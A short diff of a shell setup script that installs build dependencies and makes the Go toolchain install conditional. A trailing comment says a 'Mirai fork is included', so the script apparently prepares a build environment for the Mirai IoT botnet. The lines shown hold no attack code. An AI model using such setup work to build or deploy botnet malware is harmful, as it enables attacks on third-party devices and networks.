@@ -9,10 +9,12 @@ echo "apt-get update"
 apt-get install -y git gcc electric-fence mysql-server mysql-client duende
 mkdir -p /etc/maradns/logger/
 
-curl -O https://storage.googleapis.com/golang/go1.11.1.linux-amd64.tar.gz
-tar -C /usr/local -xzf go1.11.1.linux-amd64.tar.gz
-mkdir -p ~/go; echo "export GOPATH=$HOME/go" >> ~/.bashrc
-echo "export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin" >> ~/.bashrc
+if [ ! -d ~/go ]; then
+  curl -O https://storage.googleapis.com/golang/go1.11.1.linux-amd64.tar.gz
+  tar -C /usr/local -xzf go1.11.1.linux-amd64.tar.gz
+  mkdir -p ~/go; echo "export GOPATH=$HOME/go" >> ~/.bashrc
+  echo "export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin" >> ~/.bashrc
+fi
 source ~/.bashrc
 
 # Mirai fork is included, no need to checkout
